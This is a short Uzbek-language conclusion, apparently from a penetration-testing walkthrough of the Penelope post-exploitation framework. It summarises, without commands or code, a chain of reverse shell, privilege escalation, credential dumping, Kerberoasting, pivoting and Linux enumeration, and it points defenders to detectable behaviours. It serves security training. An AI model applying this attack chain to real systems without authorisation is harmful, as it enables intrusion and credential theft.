Bu engagement Penelope oddiy shell-ushlagich emas, balki to'liq post-exploitation markazi sifatida ishlashini ko'rsatdi. Windows domen kontrolleridagi bitta reverse shell'dan boshlab, uning modullari yordamida SYSTEM'gacha huquq oshirdik, credential'larni dump qildik, Active Directory ma'lumotlarini yig'dik, bitta service account'ni Kerberoast qildik, Meterpreter'ga uzatdik va ortimizdan tozaladik. So'ng Ligolo-ng pivot orqali yashirin subnetga o'tdik, Linux hostni egallab oldik va PEASS-ng, LSE, Linux Exploit Suggester hamda UAC bilan to'liq enumeratsiya o'tkazdik. Nihoyat, freymvorkning operatsion umurtqa pog'onasini — maxsus listener'lar, moslashtirilgan payload'lar, bind-shell ulanishlari, ko'p sessiyani boshqarish, port forwarding, fayl uzatish va o'rnatilgan HTTP server'ni — ishlatib ko'rdik. Windows va Linux bo'ylab bir xilda Penelope butun ish oqimini bitta izchil, audit qilsa bo'ladigan konsolga birlashtirdi.

Himoyachilar uchun esa xuddi shu qadam-baqadam ko'rib chiqish — kuzatiladigan xatti-harakatlar va hujum zanjirini uzadigan nazoratlarning aniq xaritasi. Faqat aniq ruxsatingiz bo'lgan joyda ishlatilsa, Penelope zamonaviy operator uchun kuchli "kuch ko'paytirgich" (force multiplier) bo'ladi.
